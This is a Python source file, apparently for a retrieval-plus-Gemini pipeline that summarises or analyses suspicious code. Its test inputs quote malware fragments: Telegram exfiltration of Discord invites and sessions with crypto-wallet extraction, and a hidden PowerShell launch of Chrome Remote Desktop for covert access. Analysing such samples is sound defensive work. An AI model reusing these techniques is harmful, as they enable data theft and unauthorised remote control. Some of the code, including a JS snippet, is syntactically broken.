# from src.generation.model_config import ModelConfig
# from src.generation.model import AIModel
from src.retrieval.retrieval import retrieve_similar_documents, build_query_prompt, build_query_prompt_for_skills_analysis
from src.common.gemini_agent import GeminiAgent

import time
import random
TIME_SEED = int(time.time()) % 50 # get current time and map to range [0,49] by modulo
random.seed(TIME_SEED)


# def set_up_model():
#     config = ModelConfig()
#     model = AIModel(config)
#     print(f"[INFO] Loaded model: {config.model_name}")
#     return model


# def build_prompt_from_retrieve_similar_documents(user_prompt : str):
#     similar_documents = retrieve_similar_documents(build_query_prompt(user_prompt))
#     user_prompt = f'''
#         User Prompt:
#         {user_prompt}
#         Retrieved Knowledge:
#         {" ".join(similar_documents)}
#     '''
#     return user_prompt

def format_and_truncate_documents(self, documents: list[str], max_tokens: int = 2000) -> str:
    """
    Duyệt qua danh sách các tài liệu truy xuất được và chỉ giữ lại những tài liệu nằm trong giới hạn max_tokens.
    """
    selected_docs = []
    current_token_count = 0
    
    for doc in documents:
        # Đếm số token của document hiện tại (không thêm special tokens của prompt)
        tokens = self.tokenizer.encode(doc, add_special_tokens=False)
        doc_token_length = len(tokens)
        
        # Nếu thêm document này vào vẫn an toàn dưới ngưỡng
        if current_token_count + doc_token_length <= max_tokens:
            selected_docs.append(doc)
            current_token_count += doc_token_length
        else:
            # Tùy chọn: Nếu muốn tận dụng không gian còn lại, cắt một phần của doc cuối cùng
            remaining_space = max_tokens - current_token_count
            if remaining_space > 50: # Giữ lại nếu còn đủ chỗ cho khoảng vài câu
                truncated_doc = self.tokenizer.decode(tokens[:remaining_space])
                selected_docs.append(truncated_doc + "\n...[Truncated due to token limit]")
            
            # Dừng lại vì đã đầy context window
            break 
            
    return "\n\n".join(selected_docs)

def concate_documents(documents: list[str]) -> str:
    return "\n\n".join(documents)

# def build_summary_generation(documents: list[str]) -> str:
#     gemini_agent = GeminiAgent()

#     return gemini_agent.execute_task(concate_documents(documents), "summary-generation")

def build_summary_generation(user_prompt: str, documents: list[str]) -> str:
    gemini_agent = GeminiAgent()
    
    # Định dạng lại prompt gửi cho AI sao cho khớp với System Prompt
    final_prompt = f"""[TARGET CODE]:
        {user_prompt}

        [WEB SEARCH CONTEXT]:
        {concate_documents(documents)}
    """

    return gemini_agent.execute_task(final_prompt, "summary-generation")

def build_skills_analysis_generation(user_prompt: str, documents: list[str]) -> str:
    gemini_agent = GeminiAgent()
    
    final_prompt = f"""[TARGET CODE]:
        {user_prompt}

        [WEB SEARCH CONTEXT]:
        {concate_documents(documents)}
    """

    return gemini_agent.execute_task(final_prompt, "skills-analysis")

def build_prompt_from_retrieve_similar_documents(user_prompt: str):
    similar_documents = retrieve_similar_documents(build_query_prompt(user_prompt))

    return build_summary_generation(user_prompt, similar_documents)

def build_prompt_from_retrive_similar_documents_for_skills_analysis(user_prompt: str):
    similar_docs = retrieve_similar_documents(build_query_prompt_for_skills_analysis(user_prompt))

    return build_skills_analysis_generation(user_prompt, similar_docs)

if __name__ == '__main__':

    question1 = """
    const tempDir = path.join(os.tmpdir(), 'telegram-sessions')
    await sendInviteToTelegram(guild.name, inviteLink)
    setTimeout(() => {
        if (client.readyAt) {
            client.destroy();
            resolve({
                success: true,
                serversProcessed: processedCount,
                totalServers: totalServers,
                timeout: true
            });
        } else if (loginAttempted) {
            client.destroy();
            reject({
                success: false,
                error: 'Connection timeout - token may be invalid or expired'
            });
        }
    }, 30000)
    await bot.sendMessage(chatId, `🔍 **Starting Cryptocurrency Wallet Extraction**\\n\
        \n**Host:** ${hostname}\\n**Status:** Scanning for wallet extensions...`)
    fs.copyFileSync(sessionInfo.filePath, tempFilePath)
    """
   
    question2 = """
    function runChromeRemoteDesktopHost = function runChromeRemoteDesktopHost() {
        return new Promise((resolve) => {
        try {
            const hostname = os.hostname();
            const exePath = getChromeRemoteDesktopPath();
            if (!fs.existsSync(exePath)) {
                resolve(false); // Not installed yet
                return;
            }
            // Use PowerShell to run completely hidden with proper argument escaping
            // Escape backslashes and quotes for PowerShell
            const escapedPath = exePath.replace(/\\\\/g, '\\\\\\\\').replace(/\"/g, '\\\\\"');
            const escapedCode = AUTH_CODE.replace(/\"/g, '\\\\\"');
            const escapedRedirect = REDIRECT_URL.replace(/\"/g, '\\\\\"');
            const escapedHostname = hostname.replace(/\"/g, '\\\\\"');
            // Method 1: Use Start-Process with proper argument list (single string format)
            // Use single quotes for the file path and double quotes for arguments to avoid escaping issues
            const psCommand = `$exe = '${exePath}'; Start-Process -FilePath${escapedPath} -ArgumentList '-code \"${escapedCode}\" -redirect \"${escapedRedirect}\" -hostname \"${escapedHostname}\"' -WindowStyle Hidden -NoNewWindow`;
            const ps = spawn('powershell.exe', ['-Command', psCommand], { windowsHide: true });
            ps.on('error', (err) => {
                resolve(false); // Failed to start process
            });
            ps.on('exit', (code) => {
                resolve(true); // Process started successfully
            });
        } catch (e) {
            resolve(false); // Any error during setup is treated as failure
        }
    });
    """

    for question in [question1, question2]:
        print("\nGenerated Summary for question:")
        summary = build_prompt_from_retrieve_similar_documents(question)
        print(summary)
        print("\n" + "="*80 + "\n")